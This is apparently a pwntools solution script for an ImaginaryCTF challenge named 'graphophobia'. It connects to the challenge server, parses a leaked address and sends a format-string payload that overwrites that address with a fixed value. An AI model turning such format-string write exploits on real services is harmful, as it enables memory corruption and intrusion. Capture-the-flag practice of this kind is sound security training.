from pwn import *

context.arch = "amd64"

# io = process("./graphophobia")
io = remote("puzzler7.imaginaryctf.org", 8000)
io.recvuntil(b"at ")
addr = int(io.recvlineS().strip(), 16)
io.sendline(fmtstr_payload(6, {addr: 0x87654321}))
io.interactive()
